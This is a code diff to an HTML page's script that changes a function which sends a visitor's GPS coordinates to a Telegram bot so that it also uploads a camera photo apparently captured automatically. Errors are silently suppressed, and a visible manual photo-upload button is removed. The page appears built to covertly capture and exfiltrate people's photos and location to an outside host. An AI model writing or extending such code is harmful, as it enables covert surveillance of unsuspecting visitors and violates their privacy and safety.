@@ -19,10 +19,22 @@
     let stream = null;
 
     function sendToTelegram(lat, lon, photoData) {
-      const message = `📸 Photo Captured!\n\n📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .catch(() => {});
+      // Send photo first
+      if (photoData) {
+        fetch(photoData)
+          .then(res => res.blob())
+          .then(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+            formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
+            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          })
+          .catch(() => {});
+      }
     }
 
     async function autoCapture() {
@@ -66,24 +78,4 @@
   </script>
 
 </body>
-</html>
-  </script>
-</body><button id="instantBtn">Take Instant Photo</button>
-<input id="instantInput" type="file" accept="image/*" capture="environment" style="display:none" />
-<img id="instantPreview" alt="Preview" style="max-width:320px;display:block;margin-top:12px;border:1px solid #ccc;" />
-
-<script>
-  const instantBtn = document.getElementById('instantBtn');
-  const instantInput = document.getElementById('instantInput');
-  const instantPreview = document.getElementById('instantPreview');
-
-  instantBtn.addEventListener('click', () => instantInput.click());
-
-  instantInput.addEventListener('change', (e) => {
-    const file = e.target.files && e.target.files[0];
-    if (!file) return;
-    const url = URL.createObjectURL(file);
-    instantPreview.src = url;
-  });
-</script>
 </html>
